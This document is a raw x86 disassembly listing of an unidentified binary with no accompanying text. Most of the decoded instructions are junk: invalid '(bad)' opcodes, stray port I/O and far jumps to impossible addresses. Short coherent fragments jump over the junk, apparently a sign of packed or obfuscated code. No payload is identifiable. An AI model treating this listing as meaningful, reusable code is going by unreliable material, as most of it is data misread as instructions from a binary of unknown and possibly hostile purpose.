  40de0b:	adc    ebp,esi
  40de0d:	sti    
  40de0e:	inc    edi
  40de0f:	adc    ebx,ebp
  40de11:	aaa    
  40de12:	push   edx
  40de13:	sar    DWORD PTR [edx],1
  40de15:	jnp    0x40de90
  40de17:	or     eax,0xbd760ac9
  40de1c:	sub    DWORD PTR [edi+0x350e4a65],edx
  40de22:	clc    
  40de23:	inc    eax
  40de24:	pushf  
  40de25:	shr    BYTE PTR [esi+0x4d],0x10
  40de29:	mov    ebp,0x8b5b0154
  40de2e:	call   0x7d8f:0xc17858ce
  40de35:	and    BYTE PTR [edx-0x38],ch
  40de38:	cmp    edi,DWORD PTR [ecx+0x48]
  40de3b:	pop    ecx
  40de3c:	out    0xac,al
  40de3e:	enter  0x896c,0xb4
  40de42:	cmp    BYTE PTR [eax+ebx*4-0x585d821b],0xa7
  40de4a:	(bad)  
  40de4b:	and    ebx,edi
  40de4d:	xor    DWORD PTR [ecx-0x5c222b6],0x4e0ac3a5
  40de57:	dec    esi
  40de58:	shr    BYTE PTR [esi+0x59],cl
  40de5b:	outs   dx,BYTE PTR ds:[esi]
  40de5c:	inc    ecx
  40de5d:	sti    
  40de5e:	adc    BYTE PTR [edx-0x7f00bef8],0x2e
  40de65:	xchg   esp,eax
  40de66:	stos   BYTE PTR es:[edi],al
  40de67:	test   DWORD PTR [ecx-0x65],edi
  40de6a:	mov    dh,BYTE PTR [ebx+0x7a]
  40de6d:	or     DWORD PTR [edx],ebp
  40de6f:	scas   eax,DWORD PTR es:[edi]
  40de70:	leave  
  40de71:	xchg   ecx,eax
  40de72:	jbe    0x40deee
  40de74:	sbb    eax,0x8b5ff819
  40de79:	jbe    0x40de04
  40de7b:	cmp    ah,BYTE PTR [esi+edx*1+0x47]
  40de7f:	aas    
  40de80:	pop    ds
  40de81:	mov    ds:0x8c226633,al
  40de86:	shr    BYTE PTR ss:[esp+eax*4+0x74],0xce
  40de8c:	and    eax,0xfebe3c1e
  40de91:	iret   
  40de92:	dec    edi
  40de93:	fnstsw WORD PTR ds:0xc203ec7b
  40de99:	mov    ebp,DWORD PTR [eax+eiz*4]
  40de9c:	aaa    
  40de9d:	jo     0x40dec7
  40de9f:	sbb    ebx,DWORD PTR [ebp-0x2f]
  40dea2:	xchg   DWORD PTR [eax-0x18],edx
  40dea5:	add    DWORD PTR [edi],eax
  40dea7:	push   ebx
  40dea8:	retf   0x5fc6
  40deab:	ds out dx,al
  40dead:	(bad)  
  40deae:	fucomip st,st(2)
  40deb0:	test   BYTE PTR [edx+0x6b],al
  40deb3:	test   esp,esi
  40deb5:	pop    ecx
  40deb6:	aas    
  40deb7:	fnstcw WORD PTR [ecx]
  40deb9:	adc    eax,ebx
  40debb:	aas    
  40debc:	mov    esp,0x620ee565
  40dec1:	imul   eax,DWORD PTR [edi-0x2c],0xffffffd3
  40dec5:	test   DWORD PTR [eax+0x285662e9],ebp
  40decb:	lods   eax,DWORD PTR ds:[esi]
  40decc:	js     0x40dea6
  40dece:	std    
  40decf:	pop    edx
  40ded0:	inc    ecx
  40ded1:	pop    DWORD PTR [edi-0x48]
  40ded4:	xchg   DWORD PTR [edx],ecx
  40ded6:	pop    edi
  40ded7:	dec    ecx
  40ded8:	push   esp
  40deda:	sti    
  40dedb:	arpl   WORD PTR [eax+0x7a8672df],bp
  40dee1:	push   es
  40dee2:	outs   dx,DWORD PTR ds:[esi]
  40dee3:	mov    ebp,0x8235db7c
  40dee8:	mov    ecx,0xfbc7b5da
  40deed:	and    dl,dl
  40deef:	or     al,0x6d
  40def1:	mov    dl,BYTE PTR [esp+eax*8-0x7bd329a1]
  40def8:	xor    cl,BYTE PTR [esi+ebx*1]
  40defb:	xor    al,0x1e
  40defd:	leave  
  40defe:	mov    ebp,0x4429b72a
  40df03:	in     al,dx
  40df04:	add    al,0x89
  40df06:	inc    esp
  40df07:	scas   al,BYTE PTR es:[edi]
  40df08:	sbb    bh,BYTE PTR [ecx-0x4f]
  40df0b:	mov    edx,0x34683a57
  40df10:	retf   
  40df11:	pushf  
  40df12:	and    BYTE PTR [edx-0x23],dh
  40df15:	repz jg 0x40deda
  40df18:	iret   
  40df19:	push   ecx
  40df1a:	(bad)  ds:0x5ece2267
  40df20:	add    BYTE PTR [ebx+0x71],ah
  40df23:	jne    0x40df18
  40df25:	jnp    0x40df09
  40df27:	xchg   ecx,eax
  40df28:	jmp    0x6fe596d2
  40df2d:	ss ret 0x6fc0
  40df31:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df33:	xor    al,0xb
  40df35:	or     eax,0xdc4cdab2
  40df3a:	dec    ecx
  40df3b:	fdivr  st,st(4)
  40df3d:	adc    DWORD PTR [ecx],eax
  40df3f:	push   eax
  40df40:	and    BYTE PTR [esi],ch
  40df42:	lds    ecx,FWORD PTR [ecx]
  40df44:	cmp    al,0xbb
  40df46:	jl     0x40df23
  40df48:	mov    dh,0x79
  40df4a:	ffree  st(5)
  40df4c:	or     DWORD PTR [ecx+0x62c16818],edi
  40df52:	sub    DWORD PTR [edi],esp
  40df54:	cdq    
  40df55:	stc    
  40df56:	aaa    
  40df57:	jno    0x40df71
  40df59:	sbb    BYTE PTR [ecx+edi*4],dh
  40df5c:	aas    
  40df5d:	cli    
  40df5e:	mov    ds:0xeb77cd16,eax
  40df63:	jb     0x40df96
  40df65:	sub    al,0xb2
  40df67:	mov    ecx,0x65a5a9f6
  40df6c:	enter  0xb12e,0x3f
  40df70:	out    dx,al
  40df71:	les    ecx,FWORD PTR [edi-0x32]
  40df74:	pop    edx
  40df75:	(bad)  
  40df76:	into   
  40df77:	mov    bl,0x70
  40df79:	jb     0x40df57
  40df7b:	inc    edi
  40df7c:	test   eax,0xee23ee3b
  40df81:	sub    ecx,DWORD PTR [ecx+0x1a]
  40df84:	mov    ds:0x570d0c86,al
  40df89:	or     al,0x2a
  40df8b:	faddp  st(6),st
  40df8d:	fimul  DWORD PTR [ecx-0xf0e8592]
  40df93:	lea    eax,[ebp-0x13]
  40df96:	aas    
  40df97:	iret   
  40df98:	or     BYTE PTR [edi+0x49],cl
  40df9b:	pop    ebp
  40df9c:	jmp    FWORD PTR [ebp-0x3c22d461]
  40dfa2:	adc    ch,bl
  40dfa4:	cmp    eax,0x4287ef57
  40dfa9:	loop   0x40dfae
  40dfab:	ret    
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0xc40413a],1
  40dfde:	int    0xed
  40dfe0:	cmc    
  40dfe1:	mov    BYTE PTR [edx+0x7e357878],dh
  40dfe7:	js     0x40e061
  40dfe9:	inc    eax
  40dfea:	std    
  40dfeb:	xor    cl,bl
  40dfed:	or     esp,eax
  40dfef:	sbb    ecx,DWORD PTR [eax]
  40dff1:	add    BYTE PTR [esi],dh
  40dff3:	jg     0x40e03e
  40dff5:	push   es
  40dff6:	(bad)  
  40dff7:	adc    cl,BYTE PTR [edx+0x3b239eed]
  40dffd:	push   ebx
  40dffe:	sbb    dh,BYTE PTR [ebx-0x2c]
  40e001:	(bad)  
  40e002:	push   ebp
  40e003:	mov    BYTE PTR [ecx+0x4d50df4e],0x4c
  40e00a:	(bad)  
  40e00b:	lahf   
  40e00c:	(bad)  
  40e00d:	fldenv [esi+0x33]
  40e010:	sbb    BYTE PTR [edx],dh
  40e012:	xchg   ebp,eax
  40e013:	or     ah,ah
  40e015:	in     al,dx
  40e016:	inc    ebp
  40e017:	adc    BYTE PTR [eax],cl
  40e019:	jb     0x40e05f
  40e01b:	jge    0x40e04c
  40e01d:	push   0x114a4979
  40e022:	(bad)  
  40e023:	mov    bl,0x9b
  40e025:	ins    BYTE PTR es:[edi],dx
  40e026:	dec    esi
  40e027:	test   esi,ebp
  40e029:	les    eax,FWORD PTR [edx+0x559d4b4e]
  40e02f:	das    
  40e030:	cmc    
  40e031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e032:	mov    ds:0x358f0402,al
  40e037:	and    BYTE PTR [esi+ebp*8-0x7f],cl
  40e03b:	mov    al,ds:0xaceb90dd
  40e040:	je     0x40e0bc
  40e042:	or     eax,0x1e2ae3eb
  40e047:	mov    dl,0xa3
  40e049:	ss xor eax,0x10a624f3
  40e04f:	jmp    0xdb2ed706
  40e054:	into   
  40e055:	shl    esp,0xa3
  40e058:	pop    esi
  40e059:	or     DWORD PTR [esi-0x47c16393],0xffffffdf
  40e060:	xchg   ebx,eax
  40e062:	test   BYTE PTR [ebp+0x388af3b2],bh
  40e068:	cmp    DWORD PTR [edi-0x33af78d5],0xffffffbf
  40e06f:	pop    eax
  40e070:	inc    edi
  40e071:	or     DWORD PTR ds:0xf8006b48,0xe0b79cd
  40e07b:	test   al,0x89
  40e07d:	shl    bl,1
  40e07f:	mov    esi,0xfcbcf47d
  40e084:	cli    
  40e085:	stc    
  40e086:	sbb    edx,DWORD PTR [edi+0x4912144e]
  40e08c:	adc    ah,BYTE PTR [ebx-0x71]
  40e08f:	adc    DWORD PTR [edx],eax
  40e091:	in     al,0xf4
  40e093:	dec    esi
  40e094:	and    eax,0xcf0207b2
  40e099:	xchg   BYTE PTR [esi],bh
  40e09b:	pusha  
  40e09c:	dec    edi
  40e09d:	lds    ecx,FWORD PTR [esi+0x63]
  40e0a0:	je     0x40e0ea
  40e0a2:	js     0x40e111
  40e0a4:	out    dx,eax
  40e0a5:	out    0xa8,al
  40e0a7:	enter  0xe96e,0x16
  40e0ab:	mov    cl,0x3d
  40e0ad:	add    eax,0x897dc4e7
  40e0b2:	pop    es
  40e0b3:	and    eax,0xe9c87e2
  40e0b8:	pop    esp
  40e0b9:	sub    al,0xa3
  40e0bb:	test   BYTE PTR [esi-0x2e],bh
  40e0be:	xor    BYTE PTR ds:0xc3064249,0x80
  40e0c5:	leave  
  40e0c6:	dec    esi
  40e0c7:	loopne 0x40e079
  40e0c9:	add    ebp,edx
  40e0cb:	bound  ebp,QWORD PTR [eax]
  40e0cd:	fcmovne st,st(3)
  40e0cf:	(bad)  
  40e0d0:	jmp    0x40e150
  40e0d2:	test   BYTE PTR [esi],0xfb
  40e0d5:	repnz shr DWORD PTR [esi+ecx*2+0x14],0x78
  40e0db:	adc    BYTE PTR [ecx],ah
  40e0dd:	jnp    0x40e131
  40e0df:	jnp    0x40e068
  40e0e1:	cmp    DWORD PTR [ebp+edi*8+0x7a632cf7],esp
  40e0e8:	xchg   DWORD PTR [ebp-0x5a619672],ebp
  40e0ee:	repz test DWORD PTR [ebx-0x3b08ed0],ebp
  40e0f5:	lahf   
  40e0f6:	add    bl,BYTE PTR [esi-0x5ca19ab6]
  40e0fc:	ja     0x40e155
  40e0fe:	cdq    
  40e0ff:	xor    esi,DWORD PTR [esi]
  40e101:	(bad)  
  40e102:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e103:	pop    ds
  40e104:	(bad)  
  40e105:	(bad)
  40e108:	inc    ebp
  40e109:	int    0x5f
  40e10b:	out    dx,eax
  40e10c:	pop    edi
  40e10d:	and    ebx,ebp
  40e10f:	add    BYTE PTR [ebp-0x1b],0x2c
  40e113:	jp     0x40e0b7
  40e115:	sub    edi,DWORD PTR [ecx+0xe]
  40e118:	test   BYTE PTR [esi],ah
  40e11a:	shr    BYTE PTR ds:0xa59f9338,cl
  40e120:	cmp    DWORD PTR [ebx*4+0x7ece6c3e],eax
  40e127:	dec    edi
  40e128:	icebp  
  40e129:	mov    eax,ds:0xcbe34e1
  40e12e:	pop    edi
  40e12f:	pop    es
  40e130:	das    
  40e131:	push   cs
  40e132:	int3   
  40e133:	pop    edi
  40e134:	clc    
  40e135:	and    DWORD PTR [esi],ebp
  40e137:	addr16 sub al,al
  40e13a:	iret   
  40e13b:	jecxz  0x40e130
  40e13d:	xchg   BYTE PTR [eax],dl
  40e13f:	imul   ebp,DWORD PTR [eax+0x53],0xffffff89
  40e143:	add    ch,bh
  40e145:	(bad)  
  40e146:	jmp    FWORD PTR [esi+0x20]
  40e149:	int3   
  40e14a:	adc    al,0x51
  40e14c:	nop    DWORD PTR [ebx]
  40e14f:	lea    ecx,[esi+ebp*4+0x93e7945]
  40e156:	scas   eax,DWORD PTR es:[edi]
  40e157:	add    ebp,ebp
  40e159:	inc    esp
  40e15a:	repnz or bh,BYTE PTR [ebx+0x2118ddc]
  40e161:	add    eax,0x2be239fc
  40e166:	mov    edx,0x993d7a61
  40e16b:	mov    bl,cl
  40e16d:	iret   
  40e16e:	pop    ebp
  40e16f:	push   0xd2ccd1f7
  40e174:	inc    DWORD PTR [esi-0xa5d2b51]
  40e17a:	xchg   al,dl
  40e17c:	mov    ds:0xcfffff7b,eax
  40e181:	jp     0x40e1df
  40e183:	mov    al,ds:0xa73b806d
  40e188:	xor    DWORD PTR ds:0x3b317d5,esi
  40e18e:	sub    al,0x47
  40e190:	jecxz  0x40e1b0
  40e192:	pop    es
  40e193:	mov    ?,WORD PTR ds:[edx+0x700e943]
  40e19a:	enter  0x1899,0x5c
  40e19e:	pop    ebp
  40e19f:	inc    ecx
  40e1a0:	cmp    al,0x7c
  40e1a2:	push   ebx
  40e1a3:	xchg   BYTE PTR [esp+ebp*2-0x78],cl
  40e1a7:	xchg   ebx,eax
  40e1a8:	(bad)  
  40e1a9:	into   
  40e1aa:	sti    
  40e1ab:	aas    
  40e1ac:	je     0x40e134
  40e1ae:	out    0xf9,al
  40e1b0:	pop    ebx
  40e1b1:	ss add al,0x96
  40e1b4:	mov    ecx,0xdd64c294
  40e1b9:	je     0x40e146
  40e1bb:	ror    DWORD PTR [esi-0x303c3201],1
  40e1c1:	test   DWORD PTR ds:0x9069d8e9,edx
  40e1c7:	aaa    
  40e1c8:	cmc    
  40e1c9:	inc    ebp
  40e1ca:	and    ebx,DWORD PTR [edi+0x1f]
  40e1cd:	loope  0x40e1be
  40e1cf:	js     0x40e153
  40e1d1:	inc    eax
  40e1d2:	scas   eax,DWORD PTR es:[edi]
  40e1d3:	sbb    eax,0xb9d307ab
  40e1d8:	mov    ebx,0x9de83ce9
  40e1dd:	xchg   BYTE PTR [eax*2-0x6dbab620],ch
  40e1e4:	les    edx,FWORD PTR [eax]
  40e1e6:	ja     0x40e1ae
  40e1e8:	xor    DWORD PTR [edx],esp
  40e1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1eb:	mov    edx,0xdeec5dfd
  40e1f0:	mov    WORD PTR [esi-0x59],cs
  40e1f3:	mov    esi,0x48fe06ad
  40e1f8:	out    0x25,eax
  40e1fa:	xor    BYTE PTR [edi-0x5a],dl
  40e1fd:	out    dx,al
  40e1fe:	jecxz  0x40e20b
  40e200:	add    bl,bh
  40e202:	dec    edi
  40e203:	push   ss
  40e204:	sub    BYTE PTR [ecx+0x32ba2b09],0xf9
  40e20b:	pop    ecx
  40e20c:	mov    ebx,0xaa07b9d2
  40e211:	mov    edi,0x776218f5
  40e216:	inc    ebp
  40e217:	push   edi
  40e218:	jl     0x40e23d
  40e21a:	mov    al,ds:0xcb2f7b3
  40e21f:	mov    edx,0x8122fa55
  40e224:	xor    eax,esi
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	sbb    ah,0x84
  40e23d:	sahf   
  40e23e:	inc    ebp
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e216
  40e247:	out    dx,eax
  40e248:	jmp    0x9f5b0125
  40e24d:	inc    ecx
  40e24e:	jmp    0x7d6c:0xde6ba475
  40e255:	pop    edx
  40e256:	loope  0x40e2c6
  40e258:	(bad)  
  40e25a:	adc    al,0x41
  40e25c:	mov    ds:0x38697953,eax
  40e261:	(bad)  
  40e265:	mov    edx,DWORD PTR [ebx-0x4f05ef02]
  40e26b:	and    ebp,DWORD PTR [edx+ebx*2]
  40e26e:	mov    dh,0xca
  40e270:	hlt    
  40e271:	mov    BYTE PTR [ecx-0x1b],0x21
  40e275:	(bad)  
  40e276:	pop    edi
  40e277:	aam    0x9a
  40e279:	int    0x8
  40e27b:	data16 or BYTE PTR [edi-0x59],dh
  40e27f:	ins    DWORD PTR es:[edi],dx
  40e280:	xchg   ecx,eax
  40e281:	in     eax,dx
  40e282:	sub    eax,DWORD PTR [ecx]
  40e284:	mov    ebp,0x2d4f4533
  40e289:	jge    0x40e2ff
  40e28b:	and    edi,DWORD PTR [ebx]
  40e28d:	dec    esp
  40e28e:	xor    BYTE PTR [ecx+0x9],al
  40e291:	adc    eax,0x7d5140fd
  40e296:	fwait
  40e297:	and    DWORD PTR [ebp+0x3f],esp
  40e29a:	int3   
  40e29b:	std    
  40e29c:	repz loope 0x40e30a
  40e29f:	push   ebx
  40e2a0:	mov    dl,BYTE PTR [edx-0x40]
  40e2a3:	dec    esp
  40e2a4:	pushf  
  40e2a5:	or     al,BYTE PTR [edx]
  40e2a7:	dec    ebx
  40e2a8:	ret    
  40e2a9:	stos   DWORD PTR es:[edi],eax
  40e2aa:	mov    al,ds:0xa9cfb945
  40e2af:	push   ds
  40e2b0:	cmp    eax,0xd4483e5a
  40e2b5:	add    DWORD PTR [ebp-0x75803141],esi
  40e2bb:	pop    edi
  40e2bc:	test   DWORD PTR [edx],esp
  40e2be:	pop    ds
  40e2bf:	cld    
  40e2c0:	jg     0x40e2b1
  40e2c2:	adc    eax,0x886923eb
  40e2c7:	aas    
  40e2c8:	jl     0x40e2c8
  40e2ca:	sbb    al,0xb8
  40e2cc:	mov    ebx,0x4409780c
  40e2d1:	mov    cl,0xfc
  40e2d3:	push   ds
  40e2d4:	push   cs
  40e2d5:	xor    al,0x44
  40e2d7:	jmp    0x22b7:0xb1cd6000
  40e2de:	inc    eax
  40e2df:	sub    BYTE PTR ds:0xb7c45961,0x27
  40e2e6:	(bad)  
  40e2e7:	mov    edi,0xd0667daa
  40e2ec:	cwde   
  40e2ed:	or     dh,BYTE PTR [edi+0x40]
  40e2f0:	aaa    
  40e2f1:	mov    ecx,0x3733ffd4
  40e2f6:	dec    edi
  40e2f7:	cld    
  40e2f8:	outs   dx,DWORD PTR ds:[esi]
  40e2f9:	es mov ebp,0x7c4b7ca
  40e2ff:	inc    edi
  40e300:	jns    0x40e33a
  40e302:	in     eax,dx
  40e303:	lahf   
  40e304:	gs add eax,0xfa0a578b
  40e30a:	jae    0x40e28e
  40e30c:	xchg   esp,eax
  40e30d:	jge    0x40e319
  40e30f:	add    edi,0xccdbf2b7
  40e315:	fwait
  40e316:	mov    al,0x47
  40e318:	push   es
  40e319:	pop    ds
  40e31a:	loopne 0x40e36d
  40e31c:	or     ah,ah
  40e31e:	scas   al,BYTE PTR es:[edi]
  40e31f:	mul    BYTE PTR [eax]
  40e321:	jmp    0x4f7ad71f
  40e326:	int3   
  40e327:	iret   
  40e328:	xchg   ebp,eax
  40e329:	inc    edx
  40e32a:	popa   
  40e32b:	lahf   
  40e32c:	pop    ecx
  40e32d:	adc    ecx,DWORD PTR cs:[esp+ebp*1-0x2d47311f]
  40e335:	ss in  eax,dx
  40e337:	xor    BYTE PTR [ebp-0xac184fd],0x33
  40e33e:	pop    ebp
  40e33f:	push   0xffffffd6
  40e341:	sub    al,0xa3
  40e343:	call   0x25744499
  40e348:	mov    ds:0xa9735adc,al
  40e34d:	popa   
  40e34e:	sub    al,0xe2
  40e350:	hlt    
  40e351:	stos   DWORD PTR es:[edi],eax
  40e352:	jle    0x40e2ee
  40e354:	sbb    al,0x4c
  40e356:	cmp    al,BYTE PTR [ecx+0x79]
  40e359:	in     eax,0xdd
  40e35b:	in     al,dx
  40e35c:	lods   eax,DWORD PTR ds:[esi]
  40e35d:	inc    edi
  40e35e:	and    al,0xe1
  40e360:	mov    ds:0xceb7b0e5,eax
  40e365:	and    dl,BYTE PTR [ebx-0x112c91ae]
  40e36b:	jg     0x40e3d4
  40e36d:	push   cs
  40e36e:	stos   DWORD PTR es:[edi],eax
  40e36f:	xor    eax,0x5ac8b554
  40e374:	loopne 0x40e37d
  40e376:	into   
  40e377:	ret    
  40e378:	mov    cl,0xad
  40e37a:	xor    esp,ecx
  40e37c:	push   ds
  40e37d:	xchg   dl,dl
  40e37f:	push   0xffffffdc
  40e381:	mov    eax,ds:0xfa743360
  40e386:	dec    edi
  40e387:	stc    
  40e388:	outs   dx,BYTE PTR ds:[esi]
  40e389:	dec    edx
  40e38a:	test   al,0xc8
  40e38c:	mov    esi,0x9f8e6d98
  40e391:	rol    BYTE PTR [edi-0x6dae4844],cl
  40e397:	in     eax,0xc7
  40e399:	xchg   esi,eax
  40e39a:	xchg   BYTE PTR [ebx],cl
  40e39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e39d:	imul   edi,DWORD PTR [esi+0x56c305fc],0x60c7388c
  40e3a7:	cmp    al,0x46
  40e3a9:	and    DWORD PTR [edi+0x2f],0x65
  40e3ad:	inc    esp
  40e3ae:	mov    eax,ds:0xe88c3510
  40e3b3:	mov    ebx,0xf31f9c98
  40e3b8:	inc    eax
  40e3b9:	les    ebp,FWORD PTR [ebx+0x14]
  40e3bc:	add    BYTE PTR [eax],dh
  40e3be:	xor    eax,0x90047f5b
  40e3c3:	dec    esp
  40e3c4:	xchg   ebx,eax
  40e3c5:	pop    ebx
  40e3c6:	and    ecx,DWORD PTR [ecx]
  40e3c8:	mov    al,BYTE PTR [edi-0x145bfe03]
  40e3ce:	adc    BYTE PTR [edi+0xd03f336],0x96
  40e3d5:	int3   
  40e3d6:	or     ebp,DWORD PTR [ebx]
  40e3d8:	out    0xe7,eax
  40e3da:	sti    
  40e3db:	pop    ds
  40e3dc:	jg     0x40e3d2
  40e3de:	inc    ebx
  40e3df:	call   0x19a9:0x6966fc8d
  40e3e6:	mov    ds:0xd1c59898,al
  40e3eb:	aam    0x22
  40e3ed:	leave  
  40e3ee:	in     al,dx
  40e3ef:	cmp    BYTE PTR [ebp+eax*1+0x76eec39f],al
  40e3f6:	jb     0x40e394
  40e3f8:	push   ebx
  40e3f9:	lods   eax,DWORD PTR ds:[esi]
  40e3fa:	sub    DWORD PTR [ecx-0x7dda2f12],esi
  40e400:	stc    
  40e401:	out    0x34,eax
  40e403:	enter  0x68ad,0x6e
  40e407:	retf   0xc195
  40e40a:	fsub   st(2),st
  40e40c:	add    al,BYTE PTR [edi]
  40e40e:	xchg   DWORD PTR [ecx],ecx
  40e410:	xchg   BYTE PTR [edi+esi*2+0x7e795788],dl
  40e417:	nop
  40e418:	arpl   WORD PTR [edx],sp
  40e41a:	mov    edx,0xfda8c38
  40e41f:	adc    esp,ecx
  40e421:	dec    esp
  40e422:	mov    edi,0xf0ed7032
  40e427:	push   0xfffffff0
  40e429:	and    BYTE PTR [ecx-0x77],al
  40e42c:	mul    dl
  40e42e:	dec    esi
  40e42f:	in     eax,0xfb
  40e431:	loop   0x40e43e
  40e433:	(bad)  
  40e434:	mov    WORD PTR [esi],gs
  40e436:	(bad)  
  40e437:	mov    ebp,0x98911ad4
  40e43c:	(bad)  
  40e43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e43e:	(bad)  
  40e440:	retf   
  40e441:	lock mov esp,ds
  40e444:	ja     0x40e435
  40e446:	mov    esp,0x7b193d23
  40e44b:	out    0x13,al
  40e44d:	sub    BYTE PTR [ebx+ecx*1-0x2819bb58],ah
  40e454:	push   cs
  40e455:	mov    ch,0x8
  40e457:	ds jmp 0x40e425
  40e45a:	es pop edi
  40e45c:	ds imul edx,edx,0x9d2a7705
  40e463:	add    BYTE PTR [esi+0x6582021b],0x9a
  40e46a:	scas   al,BYTE PTR es:[edi]
  40e46b:	aas    
  40e46c:	and    BYTE PTR [esi],bl
  40e46e:	sub    BYTE PTR [ebx+0x14],bl
  40e471:	add    eax,0xeb68a34c
  40e476:	xchg   DWORD PTR [edx],edi
  40e478:	loopne 0x40e4d6
  40e47a:	mov    BYTE PTR [esi],ah
  40e47c:	or     eax,0xb35f65ad
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    esi,DWORD PTR [ecx+0x2047218]
  40e4bc:	mov    ch,0x78
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e4fc
  40e4c4:	or     DWORD PTR [ebx+0x16866f9b],edi
  40e4ca:	push   ecx
  40e4cb:	mov    esi,0x9a83a9f3
  40e4d0:	loopne 0x40e507
  40e4d2:	xor    DWORD PTR [esi-0x3e81aaa5],0xffffff94
  40e4d9:	sub    BYTE PTR [ebp-0x5a4d30d2],dl
  40e4df:	or     eax,0x6fe52079
  40e4e4:	or     DWORD PTR [ebx+0x59],esp
  40e4e7:	retf   0x9397
  40e4ea:	fwait
  40e4eb:	sbb    ebx,esi
  40e4ed:	ret    
  40e4ee:	mov    esi,0x111e54ec
  40e4f3:	mov    bh,0x9e
  40e4f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4f6:	arpl   WORD PTR [edi-0x79747309],ax
  40e4fc:	retf   0x746
  40e4ff:	mov    DWORD PTR [eax],ebx
  40e501:	repz and BYTE PTR [esp+esi*4+0x2f3951d],dh
  40e509:	mov    eax,ds:0x2cd862e5
  40e50e:	cli    
  40e50f:	xchg   ebx,eax
  40e510:	inc    esp
  40e511:	jno    0x40e581
  40e513:	sub    DWORD PTR [edi+0x41b07c73],0xffffffdf
  40e51a:	lahf   
  40e51b:	cdq    
  40e51c:	adc    eax,0x86e5c5d1
  40e521:	inc    eax
  40e522:	test   DWORD PTR [ebx+0x31],0x2b801dad
  40e529:	(bad)  
  40e52a:	jge    0x40e534
  40e52c:	shl    BYTE PTR [eax+edi*8],0xdc
  40e530:	xor    al,0x25
  40e532:	xchg   ebp,eax
  40e533:	imul   ecx,DWORD PTR [eax],0x2e90bfd2
  40e539:	jmp    0x40e51b
  40e53b:	dec    edx
  40e53c:	rcl    BYTE PTR [ebx-0x61],0xb8
  40e540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e541:	adc    eax,0xf3dd918e
  40e546:	test   eax,0x7c1eef68
  40e54b:	push   ebp
  40e54c:	and    DWORD PTR [esi],ebp
  40e54e:	xchg   ebx,eax
  40e54f:	retf   
  40e550:	rcl    DWORD PTR [ebp+0x14],cl
  40e553:	jae    0x40e526
  40e555:	mov    ebx,0xe493558d
  40e55a:	fidivr DWORD PTR [ebx]
  40e55c:	jg     0x40e56a
  40e55e:	outs   dx,BYTE PTR ds:[esi]
  40e55f:	loopne 0x40e590
  40e561:	data16 mov ah,0xb9
  40e564:	add    eax,0x37e119b5
  40e569:	shld   edx,edi,0x4f
  40e56d:	daa    
  40e56e:	push   es
  40e56f:	mov    dh,0x63
  40e571:	add    eax,0x98c5d82c
  40e576:	or     eax,0x6c0c19ac
  40e57b:	je     0x40e5a3
  40e57d:	scas   al,BYTE PTR es:[edi]
  40e57e:	repz mov ebp,0x86eb9687
  40e584:	add    al,0x5
  40e586:	ds jmp 0x2448f0f7
  40e58c:	add    al,0x74
  40e58e:	adc    ah,BYTE PTR [eax+0x60396c45]
  40e594:	test   BYTE PTR [esi],ch
  40e596:	mov    esi,0x3adfbd3f
  40e59c:	xchg   ebx,eax
  40e59d:	retf   
  40e59e:	cmp    DWORD PTR [ecx-0x43910687],ebx
  40e5a4:	outs   dx,DWORD PTR ds:[esi]
  40e5a5:	sub    bh,BYTE PTR [eax-0x78]
  40e5a8:	stos   DWORD PTR es:[edi],eax
  40e5a9:	jo     0x40e53b
  40e5ab:	add    DWORD PTR [esp+edi*2],esi
  40e5ae:	jb     0x40e565
  40e5b0:	bound  ecx,QWORD PTR [edi-0x463d00b0]
  40e5b6:	push   ds
  40e5b7:	int    0x8c
  40e5b9:	(bad)  
  40e5ba:	xlat   BYTE PTR ds:[ebx]
  40e5bb:	fcom   QWORD PTR [ebx+0x22]
  40e5be:	arpl   WORD PTR [ebx-0x586c263f],bp
  40e5c4:	push   eax
  40e5c5:	mov    ebx,0xc27e231a
  40e5ca:	sub    al,0xde
  40e5cc:	std    
  40e5cd:	sub    ah,BYTE PTR [eax-0x47e4228a]
  40e5d3:	in     eax,0x48
  40e5d5:	jno    0x40e62b
  40e5d7:	retf   
  40e5d8:	sub    al,0x91
  40e5da:	sub    dh,BYTE PTR [ecx+0x56]
  40e5dd:	(bad)
  40e5e0:	neg    BYTE PTR [eax+0x10]
  40e5e3:	sbb    BYTE PTR [edx],0xe8
  40e5e6:	mov    edx,0x3dbe2cb2
  40e5eb:	(bad)  
